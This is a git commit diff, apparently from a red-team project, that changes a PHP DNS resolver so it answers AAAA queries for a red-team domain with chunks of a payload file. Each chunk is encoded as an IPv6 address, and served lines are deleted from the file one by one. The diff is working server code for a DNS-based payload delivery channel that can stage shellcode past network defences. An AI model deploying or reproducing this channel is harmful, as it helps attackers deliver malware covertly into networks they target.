1b9a0aabe1e957d01ff37c7f8ee1957b279061ed
Adam Ziaja <adamziaja@users.noreply.github.com>
2020-03-16 10:31:17 +0100

    blog.redteam.pl
    https://blog.redteam.pl

--- CustomResolver.php
+++ CustomResolver.php
@@ -21,25 +21,33 @@ class CustomResolver implements ResolverInterface
         $answers = [];
 
         foreach ($queries as $query) {
-            //This is where you can put all of your logic
-            if ('example.com.' === $query->getName() && 1 === $query->getType()) {
+            if ('redteaming.redteam.pl.' === $query->getName() && RecordTypeEnum::TYPE_AAAA === $query->getType()) {
                 $answer = new ResourceRecord();
                 $answer->setName($query->getName());
                 $answer->setClass(ClassEnum::INTERNET);
-                $answer->setType(RecordTypeEnum::TYPE_A);
-                $answer->setRdata('1.1.1.1');
+                $answer->setType(RecordTypeEnum::TYPE_AAAA);
+                $payload = 'payload.txt';
+                $lines = file($payload);
+                if (count($lines) > 0) {
+                    $v = 47;
+                    $x = str_replace('\x', '', trim($lines[0]));
+                    if (strlen($x) < 26) {
+                        $q = 26 - strlen($x);
+                        $p = str_repeat('0', $q);
+                        $x = $x . $p;
+                    }
+                    $y = date('md') . $v;
+                    $z = $x . $y;
+                    $aaaa = substr(chunk_split($z, 4, ':'), 0, -1);
+                    array_shift($lines);
+                    $file = join('', $lines);
+                    file_put_contents($payload, $file);
+                    var_dump($aaaa);
+                } else {
+                    $aaaa = 'dead:beef:dead:beef:dead:beef:dead:beef';
+                }
+                $answer->setRdata($aaaa);
                 $answer->setTtl(3600);
-
-                $answers[] = $answer;
-            }
-            if ('1.0.0.127.in-addr.arpa.' === $query->getName()) {
-                $answer = new ResourceRecord();
-                $answer->setName($query->getName());
-                $answer->setClass(ClassEnum::INTERNET);
-                $answer->setType(RecordTypeEnum::TYPE_PTR);
-                $answer->setRdata('my.custom.dns.');
-                $answer->setTtl(3600);
-
                 $answers[] = $answer;
             }
         }
